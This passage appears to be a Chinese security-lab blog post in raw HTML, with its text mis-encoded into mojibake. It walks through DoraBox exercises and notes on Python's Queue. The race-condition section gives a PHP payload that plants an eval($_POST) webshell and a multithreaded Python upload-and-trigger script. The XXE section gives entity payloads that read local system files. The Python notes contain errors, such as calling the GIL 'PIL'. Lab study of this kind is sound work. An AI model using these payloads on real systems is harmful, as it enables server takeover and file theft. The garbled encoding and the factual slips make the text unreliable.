å¼€å§‹æ‰§è¡Œçº¿ç¨‹</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"æ€»ç»“-19\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-19\">#</a> æ€»ç»“ï¼š</h2>\n<p>python ä»£ç å†™çš„æ—¶å€™ï¼Œæ€»æ˜¯çˆ±æ‰“åˆ†å·å”‰<br>\næ„Ÿè§‰å¤§å®¶å†™è„šæœ¬æˆ–è€…ä¸€äº›å°å·¥å…·ï¼Œéƒ½å–œæ¬¢ç”¨ pythonï¼Œæœ‰ç‚¹æ„æ€</p>\n<p>è¿™é‡Œæ˜¯çœ‹ä»£ç çš„æ—¶å€™æ‰¾èµ„æ–™çœ‹è§çš„ï¼ˆåæ¥æ‰å‘ç° python è‡ªå¸¦.chw apiï¼Œä¸è¿‡è‹±æ–‡çš„é˜…è¯»èµ·æ¥ä¹Ÿæœ‰ç‚¹è´¹æ—¶é—´å°±æ˜¯äº†ï¼‰ï¼š</p>\n<ul>\n<li>\n<p>Queue æ˜¯ python æ ‡å‡†åº“ä¸­çš„çº¿ç¨‹å®‰å…¨çš„åˆ—é˜Ÿ (FIFO) å®ç°<br>\næä¾›äº†ä¸€ä¸ªé€‚ç”¨äºå¤šçº¿ç¨‹ç¼–ç¨‹çš„å…ˆè¿›å…ˆå‡ºçš„æ•°æ®ç»“æ„ï¼Œå³åˆ—é˜Ÿ<br>\nç”¨æ¥åœ¨ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çº¿ç¨‹ä¹‹é—´çš„ä¿¡æ¯ä¼ é€’</p>\n</li>\n<li>\n<p>class Queue.Queue(maxsize=0)<br>\n maxsize æ˜¯ä¸ªæ•´æ•°ï¼ŒæŒ‡æ˜äº†åˆ—é˜Ÿä¸­èƒ½å­˜æ”¾çš„ä¸ªæ•°ä¸Šé™ã€‚<br>\nä¸€æ—¦è¾¾åˆ°ä¸Šé™ï¼Œæ’å…¥ä¼šå¯¼è‡´é˜»å¡ï¼Œç›´åˆ°åˆ—é˜Ÿä¸­çš„æ•°æ®è¢«æ¶ˆè´¹æ‰ã€‚<br>\nå¦‚æœ maxsize å°äºæˆ–è€…ç­‰äº 0ï¼Œåˆ—é˜Ÿå¤§å°æ²¡æœ‰é™åˆ¶</p>\n</li>\n<li>\n<p>Queue,deque,queue å¯¹æ¯”ï¼šqueue æ˜¯å¤šçº¿ç¨‹ä¸­çš„ä½¿ç”¨çš„æ ˆï¼Œä½†æ˜¯ Python è§£é‡Šå™¨æœ‰ä¸€ä¸ªå…¨å±€è§£é‡Šå™¨é” (PIL)ï¼Œ<br>\nå¯¼è‡´æ¯ä¸ª Python è¿›ç¨‹ä¸­æœ€å¤šåŒæ—¶è¿è¡Œä¸€ä¸ªçº¿ç¨‹ï¼Œ<br>\nå› æ­¤ Python å¤šçº¿ç¨‹ç¨‹åºå¹¶ä¸èƒ½æ”¹å–„ç¨‹åºæ€§èƒ½ï¼Œä¸èƒ½å‘æŒ¥å¤šæ ¸ç³»ç»Ÿçš„ä¼˜åŠ¿ã€‚</p>\n</li>\n<li>\n<p>multiprocessing.Queue æ˜¯ Python 2.6 å¼•å…¥çš„ç”¨æ¥å®ç°å¤šè¿›ç¨‹çš„ä¸€ç§é«˜æ€§èƒ½æ ˆã€‚</p>\n</li>\n<li>\n<p>collections.deque æ˜¯ä¸ºäº†é«˜æ•ˆå®ç°æ’å…¥å’Œåˆ é™¤æ“ä½œçš„åŒå‘åˆ—è¡¨ï¼Œé€‚åˆç”¨äºé˜Ÿåˆ—å’Œæ ˆã€‚</p>\n</li>\n<li>\n<p>queue å®ä¾‹æ–¹æ³•ï¼š<br>\nQueue.empty (): åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºã€‚å’Œä¸Šé¢ä¸€æ ·æ³¨æ„<br>\n Queue.full (): åˆ¤æ–­æ˜¯å¦æ»¡äº†ã€‚å’Œä¸Šé¢ä¸€æ ·æ³¨æ„<br>\n Queue.put (item, block=True, timeout=None): å¾€é˜Ÿåˆ—é‡Œæ”¾æ•°æ®ã€‚å¦‚æœæ»¡äº†çš„è¯ï¼Œblocking = False ç›´æ¥æŠ¥ Full å¼‚å¸¸ã€‚å¦‚æœ blocking = Trueï¼Œå°±æ˜¯ç­‰ä¸€ä¼šï¼Œtimeout å¿…é¡»ä¸º 0 æˆ–æ­£æ•°ã€‚None ä¸ºä¸€ç›´ç­‰ä¸‹å»ï¼Œ0 ä¸ºä¸ç­‰ï¼Œæ­£æ•° n ä¸ºç­‰å¾… n ç§’è¿˜ä¸èƒ½å­˜å…¥ï¼ŒæŠ¥ Full å¼‚å¸¸ã€‚<br>\nQueue.put_nowait (item): å¾€é˜Ÿåˆ—é‡Œå­˜æ”¾å…ƒç´ ï¼Œä¸ç­‰å¾…<br>\n Queue.get (item, block=True, timeout=None): ä»é˜Ÿåˆ—é‡Œå–æ•°æ®ã€‚å¦‚æœä¸ºç©ºçš„è¯ï¼Œblocking = False ç›´æ¥æŠ¥ empty å¼‚å¸¸ã€‚å¦‚æœ blocking = Trueï¼Œå°±æ˜¯ç­‰ä¸€ä¼šï¼Œtimeout å¿…é¡»ä¸º 0 æˆ–æ­£æ•°ã€‚None ä¸ºä¸€ç›´ç­‰ä¸‹å»ï¼Œ0 ä¸ºä¸ç­‰ï¼Œæ­£æ•° n ä¸ºç­‰å¾… n ç§’è¿˜ä¸èƒ½è¯»å–ï¼ŒæŠ¥ empty å¼‚å¸¸<br>\n Queue.get_nowait (item): ä»é˜Ÿåˆ—é‡Œå–å…ƒç´ ï¼Œä¸ç­‰å¾…ä¸¤ä¸ªæ–¹æ³•è·Ÿè¸ªå…¥é˜Ÿçš„ä»»åŠ¡æ˜¯å¦è¢«æ¶ˆè´¹è€… daemon è¿›ç¨‹å®Œå…¨æ¶ˆè´¹</p>\n</li>\n</ul>\n<h1 id=\"æ¡ä»¶ç«äº‰-ä¸Šä¼ \"><a class=\"markdownIt-Anchor\" href=\"#æ¡ä»¶ç«äº‰-ä¸Šä¼ \">#</a> æ¡ä»¶ç«äº‰ - ä¸Šä¼ </h1>\n<p>çœ‹æºç é¡ºåºï¼šæ–‡ä»¶ä¸Šä¼ ä¸Šæ¥ï¼Œæ£€æŸ¥åç¼€ï¼Œåç¼€ä¸åœ¨å…è®¸åˆ—è¡¨é‡Œï¼Œåˆ é™¤æ–‡ä»¶ã€‚</p>\n<p><img src=\"dorabox_jz_upload001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-20\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-20\">#</a> è¿‡ç¨‹ï¼š</h2>\n<p>ç«äº‰çš„åœ°æ–¹ï¼Œæ˜¯å…ˆåˆ é™¤è¿˜æ˜¯å…ˆæ‰§è¡Œï¼Œå…³é”®å°±åœ¨äºèµ¶åœ¨åˆ é™¤ä¹‹å‰æ‰§è¡Œä¸Šä¼ çš„æ–‡ä»¶ã€‚<br>\nè¿™æ˜¯æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶å†…å®¹ï¼Œæ–°å»ºä¸€ä¸ª info.php æ–‡ä»¶ï¼Œé‡Œé¢å†™å…¥ä¸€å¥è¯æœ¨é©¬ã€‚</p>\n<figure class=\"highlight php\"><figcaption><span>payload</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> fputs(fopen(<span class=\"string\">&quot;info.php&quot;</span>, <span class=\"string\">&quot;w&quot;</span>), <span class=\"string\">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt;&#x27;</span>); <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>é€šè¿‡å¹¶å‘å¯ä»¥å®ç°åœ¨ä¸Šä¼ æˆåŠŸæœªæ‰§è¡Œåˆ°åˆ é™¤ä»£ç çš„æ—¶å€™ï¼Œè®¿é—®æ‰§è¡Œï¼Œç”Ÿæˆ info.phpã€‚</p>\n<p>è„šæœ¬ï¼š</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># çˆ¶ç±» threading.Thread</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RaceCondition</span>(<span class=\"params\">threading.Thread</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_init_</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        threading.Thread._init_(self)</span><br><span class=\"line\">        self.url = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/key.php&#x27;</span> <span class=\"comment\"># é©¬</span></span><br><span class=\"line\">        self.uploadUrl = <span class=\"string\">&#x27;http://localhost/dorabox/race_condition/upload.php&#x27;</span>; <span class=\"comment\"># æå®ƒ</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># è·å–ä¸Šä¼ çš„é©¬ï¼Œå°±æ˜¯è§£ææ‰§è¡Œ</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_get</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;try to call uploaded file...&#x27;</span>)</span><br><span class=\"line\">        r = requests.get(self.url)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> r.status_code == <span class=\"number\">200</span>: <span class=\"comment\"># æåˆ°æˆåŠŸå°±é€€å‡º</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;create file info.php success.&#x27;</span>)</span><br><span class=\"line\">            os._exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># ä¼ é©¬</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">_upload</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;upload file...&#x27;</span>)</span><br><span class=\"line\">        file = &#123;<span class=\"string\">&#x27;myfile&#x27;</span> : <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;attack.php&#x27;</span>, <span class=\"string\">&#x27;r&#x27;</span>)&#125; <span class=\"comment\">#key valueçš„æ•°æ®ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯å•¥</span></span><br><span class=\"line\">        requests.post(self.uploadUrl, files=file)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># ä¸€ç›´æ</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):  <span class=\"comment\"># å…¶å®å°±å¤–é¢é‚£ä¸ªå¾ªç¯ä¸å°±å¥½äº†ï¼Œä¸ºå•¥è¿˜è¦å†å†™ä¸€ä¸ªforå•Š</span></span><br><span class=\"line\">                self._upload()</span><br><span class=\"line\">                self._get()</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    threads = <span class=\"number\">50</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        t = RaceCondition()</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(threads):</span><br><span class=\"line\">        <span class=\"comment\"># joinçš„åŸç†å°±æ˜¯ä¾æ¬¡æ£€éªŒçº¿ç¨‹æ± ä¸­çš„çº¿ç¨‹æ˜¯å¦ç»“æŸï¼Œæ²¡æœ‰ç»“æŸå°±é˜»å¡ç›´åˆ°çº¿ç¨‹ç»“æŸï¼Œå¦‚æœç»“æŸåˆ™è·³è½¬æ‰§è¡Œä¸‹ä¸€ä¸ªçº¿ç¨‹çš„joinå‡½æ•°ã€‚</span></span><br><span class=\"line\">        t.join() </span><br></pre></td></tr></table></figure>\n<p><img src=\"dorabox_jz_upload002.png\" alt=\"\"></p>\n<h2 id=\"æ€»ç»“-20\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-20\">#</a> æ€»ç»“ï¼š</h2>\n<p>python çš„ self ç«Ÿç„¶ä¸æ˜¯å…³é”®å­—ï¼Ÿï¼Ÿï¼Ÿæ˜¯å› ä¸º__init__(self) çš„æ—¶å€™åˆ›å»ºäº†ä¸€ä¸ªè¯¥ç±»çš„å®ä¾‹ï¼Œä¸”åå­—å« selfï¼Œæ‰€ä»¥æ¢æˆåˆ«çš„å­—ç¬¦ä¸²ï¼Œåœ¨åˆ«çš„å‡½æ•°é‡Œä¹Ÿèƒ½ç”¨æŠŠã€‚</p>\n<p>python ç±»å˜é‡ï¼Œå®ƒçš„å€¼å°†åœ¨è¿™ä¸ªç±»çš„æ‰€æœ‰å®ä¾‹ä¹‹é—´å…±äº«ã€‚ï¼ˆè¿˜æœ‰åœ¨_<em>init</em>_() çš„æ—¶å€™ self. å˜é‡ï¼Œè¿™å’Œ java åŒºåˆ«è¿˜è›®å¤§çš„ï¼‰</p>\n<p>å¿ƒå¾—å°±æ˜¯è§£é¢˜æ€è·¯çœŸçš„å¾ˆé‡è¦ï¼Œå› ä¸ºèœï¼Œéƒ½æ²¡è§è¿‡ï¼Œæ— ä»ä¸‹æ‰‹çš„æ„Ÿè§‰å¤ªéš¾å—äº†ï¼Œæ˜¯ä¸æ˜¯é¢˜ç›®å†™å¤šäº†å°±ä¼šæœ‰å¾ˆå¤šæ€è·¯ï¼Ÿå¸Œæœ›ä¸è¦å†™å¤šäº†é¢˜ç›®æ€ç»´åè€Œè¢«å±€é™äº†ï¼Œè¿˜æ˜¯è¦å¤šæ€è€ƒã€‚</p>\n<p>æœ€åï¼Œè¿™é“é¢˜çœŸçš„å¥½å¸…å•Šï¼ï¼ï¼</p>\n<h1 id=\"ä»»æ„æ–‡ä»¶è¯»å–\"><a class=\"markdownIt-Anchor\" href=\"#ä»»æ„æ–‡ä»¶è¯»å–\">#</a> ä»»æ„æ–‡ä»¶è¯»å–</h1>\n<p>è¾“å…¥â€¦/ï¼Œå‘ç°æ˜¯å¯ä»¥ç›´æ¥è¯»æ–‡ä»¶çš„</p>\n<p><img src=\"dorabox_readanyfile002.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-21\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-21\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>ç›´æ¥è¯»å–æ–‡ä»¶<img src=\"dorabox_readanyfile001.png\" alt=\"\"></li>\n</ol>\n<h2 id=\"æ€»ç»“-21\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-21\">#</a> æ€»ç»“ï¼š</h2>\n<p>è¿™ä¸ªï¼Œemmmmï¼Œè¿™æ ·çš„æ¼æ´ï¼Œå¾ˆéš¾æ‰¾æŠŠï¼Ÿï¼ˆå‚»å–µï¼‰</p>\n<h1 id=\"xxe\"><a class=\"markdownIt-Anchor\" href=\"#xxe\">#</a> xxe</h1>\n<p>é¶åœº php å’Œ xml äº¤äº’çš„æ—¶å€™æŠ¥é”™äº†ï¼Œç™¾åº¦æ²¡æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼Œæˆ‘å¤ªèœäº†ï¼ˆç°åœ¨ä¹Ÿå¾ˆèœå–”ï½æˆ‘ä»¬å›å®¶æ‘†å°æ‘ŠæŠŠ o (ï¿£Îµï¿£*)ï¼‰</p>\n<p><img src=\"dorabox_xxe001.png\" alt=\"\"></p>\n<h2 id=\"è¿‡ç¨‹-22\"><a class=\"markdownIt-Anchor\" href=\"#è¿‡ç¨‹-22\">#</a> è¿‡ç¨‹ï¼š</h2>\n<ol>\n<li>\n<p>çœ‹å‰ç«¯ä»£ç ï¼Œè§‚å¯Ÿåˆ°æœåŠ¡ç«¯ä»¥ xml çš„å½¢å¼æ¥æ”¶æ–‡ä»¶ï¼Œç„¶åæœåŠ¡å™¨ä¼šæ­£å¸¸è¿”å›å®¢æˆ·ç«¯åœ¨ body ä¸­ post è¿‡å»çš„ xml ä»£ç æ‰§è¡Œç»“æœ</p>\n<p><img src=\"dorabox_xxe002.png\" alt=\"\"></p>\n</li>\n<li>\n<p>æ„é€  xml æ–‡ä»¶è¯»å– attack.php</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">Sakura</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY a <span class=\"meta-keyword\">SYSTEM</span>  <span class=\"meta-string\">&quot;file:///C:/Users/lenovo/Desktop/attack.php&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">user</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">username</span>&gt;</span><span class=\"symbol\">&amp;a;</span><span class=\"tag\">&lt;/<span class=\"name\">username</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">password</span>&gt;</span>æ¡œæ¡œç§ã¯ã‚ãªãŸã‚’æ„›ã—ã¦ã„ã¾ã™<span class=\"tag\">&lt;/<span class=\"name\">password</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">user</span>&gt;</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"æ€»ç»“-22\"><a class=\"markdownIt-Anchor\" href=\"#æ€»ç»“-22\">#</a> æ€»ç»“ï¼š</h2>\n<p>xxe å°±æ˜¯å¤–éƒ¨å®ä½“æ³¨å…¥å˜›ï¼Œå¯ä»¥ä¸€è¡Œä»£ç ç¦ç”¨ã€‚</p>\n<p>xxe æ˜¯ç”± xml å’Œ dtd çº¦æŸæå‡ºæ¥çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ–‡ä»¶è·¯å¾„å’Œå˜é‡åï¼Œå›æ˜¾æ•°æ®ã€‚</p>\n<p>1ã€ å½“å¼•ç”¨çš„ DTD æ–‡ä»¶æ˜¯<strong>æœ¬åœ°æ–‡ä»¶</strong>çš„æ—¶å€™ï¼Œç”¨ SYSTEM æ ‡è¯†ï¼Œå¹¶å†™ä¸Šâ€DTD çš„æ–‡ä»¶è·¯å¾„â€ï¼Œå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;DTDæ–‡ä»¶è·¯å¾„&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>2ã€ å¦‚æœå¼•ç”¨çš„ DTD æ–‡ä»¶æ˜¯ä¸€ä¸ª<strong>å…¬å…±æ–‡ä»¶</strong>æ—¶ï¼Œé‡‡ç”¨ PUBLIC æ ‡è¯†ï¼Œå¦‚ä¸‹ï¼š</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;DTDåç§°&quot; &quot;DTDæ–‡ä»¶çš„URL&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><strong>1. å†…éƒ¨å®ä½“å£°æ˜</strong></p>\n<!ENTITY å®ä½“åç§° \"å®ä½“çš„å€¼\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">foo</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ELEMENT <span class=\"meta-keyword\">foo</span> <span class=\"meta-keyword\">ANY</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;Thinking&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">foo</span>&gt;</span><span class=\"symbol\">&amp;xxe;</span><span class=\"tag\">&lt;/<span class=\"name\">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>2. å¤–éƒ¨å®ä½“å£°æ˜</strong></p>\n<!ENTITY å®ä½“åç§° SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">test</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span>&gt;</span>]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">login</span>&gt;</span><span class=\"symbol\">&amp;test;</span><span class=\"tag\">&lt;/<span class=\"name\">login</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>ä¸Šè¿°ä¸¤ç§å‡ä¸ºå¼•ç”¨å®ä½“ï¼Œä¸»è¦åœ¨<strong> XML æ–‡æ¡£ä¸­</strong>è¢«åº”ç”¨ï¼Œå¼•ç”¨æ–¹å¼ï¼š<strong>&amp; å®ä½“åç§°ï¼›</strong> æœ«å°¾è¦å¸¦ä¸Šåˆ†å·ï¼Œè¿™ä¸ªå¼•ç”¨å°†ç›´æ¥è½¬å˜æˆå®ä½“å†…å®¹ã€‚</p>\n<p><strong>3. å‚æ•°å®ä½“å£°æ˜</strong></p>\n<!ENTITY % å®ä½“åç§° \"å®ä½“çš„å€¼\"> \n<!ENTITY % å®ä½“åç§° SYSTEM \"URI/URL\"> \n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">copyright</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">body</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;http://www.runoob.com/entities.dtd&quot;</span> &gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">xxe</span> <span class=\"meta-string\">&quot;%body;&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">reset</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">secret</span>&gt;</span>login<span class=\"tag\">&lt;/<span class=\"name\">secret</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>å‚æ•°å®ä½“ï¼Œè¢«<strong> DTD æ–‡ä»¶</strong>è‡ªèº«ä½¿ç”¨ ï¼Œå¼•ç”¨æ–¹å¼ä¸ºï¼š% å®ä½“åç§°ã€‚å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p>\n<p>å…è®¸<strong>åŒ…å«å¤–éƒ¨å®ä½“</strong>ï¼Œå°±å¯èƒ½å­˜åœ¨ XXE æ”»å‡»ã€‚</p>\n<p><strong>ã€åˆ©ç”¨ 1ã€‘è¯»å–æœ¬åœ°æ–‡ä»¶</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">creds</span> [  </span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY <span class=\"meta-keyword\">goodies</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;file:///c:/windows/system.ini&quot;</span>&gt;</span> ]&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">creds</span>&gt;</span><span class=\"symbol\">&amp;goodies;</span><span class=\"tag\">&lt;/<span class=\"name\">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>ã€åˆ©ç”¨ 2ã€‘è¯»å–å«ç‰¹æ®Šå­—ç¬¦çš„æœ¬åœ°æ–‡ä»¶</strong></p>\n<p>å¦‚æœæ–‡ä»¶ä¸­å«æœ‰ç‰¹æ®Šå­—ç¬¦ï¼Œå¦‚ &amp;,&lt;,&gt;,&quot;,' ç­‰ï¼Œé€šè¿‡ä¸Šè¿°æ–¹æ³•ä¼šæŠ¥é”™ï¼Œéœ€è¦å€ŸåŠ© CDATAï¼ŒCDATA èŠ‚ä¸­çš„æ‰€æœ‰å­—ç¬¦éƒ½ä¼šè¢«å½“åšå…ƒç´ å­—ç¬¦æ•°æ®çš„å¸¸é‡éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ xml æ ‡è®°ã€‚</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">roottag</span> [</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">start</span> <span class=\"meta-string\">&quot;&lt;![CDATA[&quot;</span>&gt;</span>   </span></span><br><span class=\"line\"><span 